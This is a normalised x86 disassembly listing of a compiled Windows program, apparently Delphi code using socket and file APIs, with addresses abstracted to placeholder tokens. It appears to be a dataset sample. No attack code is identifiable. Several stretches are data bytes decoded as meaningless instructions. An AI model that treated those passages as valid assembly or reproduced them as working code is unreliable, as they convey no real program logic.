lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4139f4
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_459aa0
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402b04
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402b04
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402b04
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_4599fc
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_4599fc
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_4599fc
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_4599c0
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_4599c0
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_4599c0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_459bb8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_459bd4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402b04
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45933c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_459c40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_459c60
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0xc ] eax
sub_459cc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_459d8d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_4036ac#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_407f24
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d94
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
sub_459db3
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_459ebd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e44
xor eax eax
push ebp
push j_sub_403580#3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_4040ac
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_404e80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ec4
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4040ac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_459e87
mov eax [ ebp - 0x4 ]
call sub_4030f8
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ec4
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e44
retn
sub_459ee8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_459f82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404374
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_458c38
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f89
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed8
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_459f90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_459fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_45a062
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45a045
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a04c
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_45a074
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_45a137
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
mov eax [ ebp - 0x8 ]
call sub_407f24
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
mov eax [ ebp - 0xc ]
call sub_407f24
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
mov eax [ ebp - 0x10 ]
call sub_407f24
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
mov eax [ ebp - 0x14 ]
call sub_407f24
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a13e
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403ed8
retn
sub_45a15c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a1ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_458c38
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f08
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a1f1
lea eax [ ebp - 0x18 ]
call sub_403eb4
retn
sub_45a1fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a28a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_458c38
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f08
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a291
lea eax [ ebp - 0x18 ]
call sub_403eb4
retn
sub_45a29c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_45a2bc
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_45a316
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a31d
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_45a324
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_45a37e
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a385
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45a38c
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_45a3c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_45a461
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_458dfc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a468
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408aac
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f08
sub_45a470
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a4a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a4b0
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_45a4e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a505
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a50c
retn
sub_45a744
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45a7a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_404500
mov eax [ ebx ]
call sub_404374
push eax
mov eax [ ebx ]
call sub_404174
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_404500
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_45a644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a7aa
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45a7b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a879
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_4042c0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407998
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407998
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_4044b8
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4043d4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f08
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a880
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed8
retn
push ebx
mov eax edi
call sub_404174
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4043d4
mov eax ebx
call sub_403eb4
jmp r-xdata
sub_45a898
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_45a7b0
mov eax esi
mov edx r-xdata
call sub_4042c0
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_4044b8
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4043d4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403f08
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404174
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4043d4
jmp r-xdata
mov eax ebx
call sub_403eb4
jmp r-xdata
sub_45a96c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45aa1f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aa26
retn
mov eax rw-data
call sub_40cc80
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
call sub_403eb4
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e44
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e44
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404930
sub_45aa28
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_45aafb
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab02
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
lea eax [ ebp - 0x4 ]
call sub_45a744
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f08
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402c28
jne r-xdata
mov eax sub_40c004
mov [ rw-data ] eax
mov [ rw-data ] sub_45a964
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e38
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f08
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e38
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f08
sub_45ac48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ ebp + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
lodsb [ esi ]
inc ebp
add [ eax + eax ] bh
add [ eax ] al
dec eax
stosd [ edi ]
inc ebp
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
pushad
scasb [ edi ]
inc ebp
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ ebp + ebp * 4 + 0x292c0045 ] ch
inc eax
add [ ecx ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
inc ebp
xchg dl bh
dec [ ebx + 0x33f08bda ]
rcl [ ebp + 0x68 ] 0x3b
scasb [ edi ]
inc ebp
add [ edi + edi * 8 + 0x30 ] ah
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae42
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_419cdc
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
fsubr [ ebp + eax * 2 + 0x54110700 ]
dec ecx
inc ecx
outsb
je r-xdata
push ebp
push sub_45ae3b
push [ fs : eax ]
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
je r-xdata
out dx eax
sti
push esi
inc esi
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
call sub_403404
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
nop
lodsb [ esi ]
inc ebp
add al bl
stosd [ edi ]
inc ebp
add [ esi ] al
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_45ae60
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45ae8c
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_45aed0
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45aed0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_45a950
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_45aef8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45af1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af24
retn
sub_45b110
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_419cdc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_45b182
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_403404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b189
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_458d78
mov edx [ rw-data ]
mov [ edx ] eax
sub_45b1a8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40346c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_419d28
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_45b20f
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b216
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40cc80
sub_45b228
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45b2d3
push [ fs : eax ]
